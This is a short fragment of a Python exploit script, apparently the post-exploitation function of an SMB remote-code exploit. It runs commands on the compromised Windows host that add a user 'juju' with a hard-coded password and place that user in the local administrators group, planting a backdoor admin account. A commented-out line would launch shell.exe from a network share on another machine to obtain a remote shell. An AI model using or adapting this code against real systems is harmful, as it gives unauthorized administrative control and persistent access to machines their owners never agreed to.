...
def smb_pwn(conn, arch):
	...
	print('Adding user juju with password 1qaz@WSX3edc')
	service_exec(conn, r'cmd /c net user /add juju 1qaz@WSX3edc')
	service_exec(conn, r'cmd /c net localgroup administrators juju /add')
	
	#payload = 'cmd /c \\\\192.168.119.203\\homeshare\\shell.exe'
